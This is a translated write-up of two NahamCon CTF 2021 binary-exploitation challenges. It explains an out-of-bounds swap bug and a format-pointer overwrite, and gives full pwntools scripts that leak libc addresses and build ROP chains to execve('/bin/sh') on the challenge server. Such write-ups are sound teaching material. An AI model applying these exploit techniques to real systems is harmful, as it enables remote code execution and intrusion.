# NahamConCTF2021 PWN WP
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Sort it
首先看一下程序的整体逻辑
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char v4; // [rsp+Fh] [rbp-71h]
      __int64 v5; // [rsp+10h] [rbp-70h] BYREF
      __int64 v6; // [rsp+18h] [rbp-68h] BYREF
      __int64 v7[12]; // [rsp+20h] [rbp-60h] BYREF
      v7[11] = __readfsqword(0x28u);
      v4 = 0;
      v7[0] = 'egnaro';
      v7[1] = 'eton';
      v7[2] = 'elppa';
      v7[3] = 'puc';
      v7[4] = 'daerb';
      v7[5] = 'arbez';
      v7[6] = 'dnah';
      v7[7] = 'naf';
      v7[8] = 'noil';
      v7[9] = 'licnep';
      clear();
      puts("Sort the following words in alphabetical order.\n");
      print_words((__int64)v7);
      printf("Press any key to continue...");
      getchar();
      while ( v4 != 1 )
      {
        clear();
        print_words((__int64)v7);
        printf("Enter the number for the word you want to select: ");
        __isoc99_scanf("%llu", &v5);
        getchar();
        --v5;
        printf("Enter the number for the word you want to replace it with: ");
        __isoc99_scanf("%llu", &v6);
        getchar();
        swap((__int64)v7, v5, --v6);
        clear();
        print_words((__int64)v7);
        printf("Are the words sorted? [y/n]: ");
        fgets(&yn, 17, stdin);
        if ( yn != 'n' )
        {
          if ( yn != 'y' )
          {
            puts("Invalid choice");
            getchar();
            exit(0);
          }
          v4 = 1;
        }
      }
      if ( (unsigned int)check((__int64)v7) )
      {
        puts("You lose!");
        exit(0);
      }
      puts("You win!!!!!");
      return 0;
    }
程序循环对给定的字符串数组进行排序，但是程序没有限制输入的`index`的范围，也就是存在数组越界漏洞。
根据数组越界漏洞结合`print_words`函数即可泄漏出栈中的一些内容，得到`libc,elf`基地址和栈地址。泄漏得到地址之后还存在一个问题就是如何将数据写入到栈中。
这里注意到`fgets`函数可以读取`0x11`字节的内容，那么我们就可以先将内容写入到`bss`中，再根据数组越界和`swap`函数将内容写入到栈中，这就构成了一个栈溢出，依次写入`rop`内容即可。
至于`rop`的触发需要等到`main`函数返回时才能执行，因此这里需要满足`check`的检查，即对字符串数组中的单词依照首字母从小到大进行排序。
    # encoding=utf-8
    from pwn import *
    file_path = "./sort_it"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = [0xe6e73, 0xe6e76, 0xe6e79]
    else:
        p = remote('challenge.nahamcon.com', 32633)
        libc = ELF('./libc-2.31.so')
        one_gadget = [0xe6e73, 0xe6e76, 0xe6e79]
    def sort(index1, index2, end=False):
        p.sendlineafter("want to select: ", str(index1))
        p.sendlineafter(" replace it with: ", str(index2))
        if end:
            p.sendlineafter("sorted? [y/n]: ", "y")
        else:
            p.sendlineafter("sorted? [y/n]: ", "n")
    def overflow(index, value):
        p.sendlineafter("want to select: ", str(1))
        p.sendlineafter(" replace it with: ", str(1))
        p.sendlineafter("sorted? [y/n]: ", b"n".ljust(8, b"\x00") + p64(value))
        sort(index, yn_offset)
    p.sendlineafter("continue...", "\n")
    sort(3, 1)
    sort(3, 8)
    sort(3, 4)
    sort(5, 2)
    sort(5, 7)
    sort(6, 10)
    sort(6, 9)
    sort(1, 11)
    p.recvuntil("1. ")
    list_address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x150
    log.success("list address is {}".format(hex(list_address)))
    sort(11, 1)
    sort(1, 14)
    p.recvuntil("1. ")
    libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 243 - libc.sym['__libc_start_main']
    log.success("libc address is {}".format(hex(libc.address)))
    sort(14, 1)
    sort(1, 18)
    p.recvuntil("1. ")
    elf.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x139f
    log.success("elf address is {}".format(hex(elf.address)))
    sort(18, 1)
    p_rdi_r = 0x0000000000026b72 + libc.address
    p_rsi_r = 0x0000000000027529 + libc.address
    p_rdx_r12_r = 0x000000000011c371 + libc.address
    yn_offset = int(((elf.address + 0x4030 - list_address) & 0xffffffffffffffff) // 8) + 2
    overflow(14, p_rdi_r)
    overflow(15, libc.search(b"/bin/sh").__next__())
    overflow(16, p_rsi_r)
    overflow(17, 0)
    overflow(18, p_rdx_r12_r)
    overflow(19, 0)
    overflow(20, 0)
    overflow(21, libc.sym['execve'])
    sort(1, 1, True)
    p.interactive()
## Rock Paper Scissors
首先来看一下程序的整体逻辑
    void real_main()
    {
      unsigned int v0; // eax
      int v1; // [rsp+4h] [rbp-Ch] BYREF
      int v2; // [rsp+8h] [rbp-8h]
      char v3; // [rsp+Fh] [rbp-1h]
      v3 = 1;
      v0 = time(0LL);
      srand(v0);
      while ( v3 )
      {
        v2 = rand() % 3 + 1;
        menu();
        __isoc99_scanf(off_404028, &v1);
        getchar();
        if ( v2 == v1 )
          puts("Congrats you win!!!!!");
        else
          puts("You lose!");
        putchar(10);
        printf("Would you like to play again? [yes/no]: ");
        read(0, &s2, 0x19uLL);
        if ( !strcmp("no\n", &s2) )
        {
          v3 = 0;
        }
        else if ( !strcmp("yes\n", &s2) )
        {
          v3 = 1;
        }
        else
        {
          puts("Well you didn't say yes or no..... So I'm assuming no.");
          v3 = 0;
        }
        memset(&s2, 0, 4uLL);
      }
    }
目测起来没有什么不对的地方，但是我们看一下`scanf`的格式化字符串
    .data:0000000000404010 ; char s2
    .data:0000000000404010 s2              db 1                    ; DATA XREF: real_main+C1↑o
    .data:0000000000404010                                         ; real_main+D2↑o ...
    .data:0000000000404011                 align 20h
    .data:0000000000404020                 dq offset unk_402008
    .data:0000000000404028 off_404028      dq offset unk_40200B    ; DATA XREF: real_main+5F↑r
    .data:0000000000404028 _data           ends
发现存储格式化字符串地址的位置和`s2`紧邻，而`s2`可以读取`0x19`字节长度的字符串，也就是说我们可以覆写`off_404028`的低一字节。
看一下格式化字符串附近的东西
    .rodata:0000000000402007                 db    0
    .rodata:0000000000402008 unk_402008      db  25h ; %             ; DATA XREF: .data:0000000000404020↓o
    .rodata:0000000000402009                 db  73h ; s
    .rodata:000000000040200A                 db    0
    .rodata:000000000040200B unk_40200B      db  25h ; %             ; DATA XREF: .data:off_404028↓o
    .rodata:000000000040200C                 db  64h ; d
看到其低地址出存在一个`%s`，也就是我们可以将`%d`更换为`%s`。也就是将程序中的
    __isoc99_scanf("%d", &v1);
更改为
    __isoc99_scanf("%s", &v1);
也就是构造出了一个栈溢出的漏洞。那么接下来就是`rop`链的构造。
这里我是先利用`puts`函数泄漏出`libc`的基地址，接着利用`csu`调用`read`函数向`bss`段中写入新的`rop`链，接着进行栈迁移，将栈地址迁移到`bss`段中，执行新的`rop`进而`getshell`。
    # encoding=utf-8
    from pwn import *
    file_path = "./rps"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        gdb.attach(p, "b *0x401451")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        p = remote('challenge.nahamcon.com', 30002)
        libc = ELF('./libc-2.31.so')
    csu_start = 0x401506
    csu_end = 0x4014F0
    bss_address = 0x404050
    leave_r = 0x0000000000401451
    p_rbp_r = 0x000000000040127d
    def csu_call(address, arg0, arg1, arg2):
        ret = p64(csu_start) + p64(0)*2 + p64(1) + p64(arg0) + p64(arg1) + p64(arg2)
        ret += p64(address) + p64(csu_end)
        return ret
    p.sendlineafter("Rock-Paper-Scissors? [y/n]: ", "y")
    p.sendlineafter("> ", "1")
    p.sendafter("again? [yes/no]: ", b"yes\n".ljust(0x18, b"\x00") + b"\x08")
    p_rdi_r = 0x0000000000401513
    payload = b"a" * 0xc + p64(bss_address)
    payload += p64(p_rdi_r) + p64(elf.got['read'])
    payload += p64(elf.plt['puts'])
    payload += csu_call(elf.got['read'], 0, bss_address, 0x100)
    payload += p64(0)*7
    payload += p64(p_rbp_r) + p64(bss_address) + p64(leave_r)
    p.sendlineafter("> ", payload)
    p.sendafter("again? [yes/no]: ", b"no\n")
    libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - libc.sym['read']
    log.success("libc address is {}".format(hex(libc.address)))
    p_rsi_r = 0x0000000000027529 + libc.address
    p_rdx_r12_r = 0x000000000011c371 + libc.address
    exp = p64(0) + p64(p_rdi_r) + p64(libc.search(b"/bin/sh\x00").__next__())
    exp += p64(p_rsi_r) + p64(0) + p64(p_rdx_r12_r) + p64(0)*2
    exp += p64(libc.sym['execve'])
    p.sendline(exp)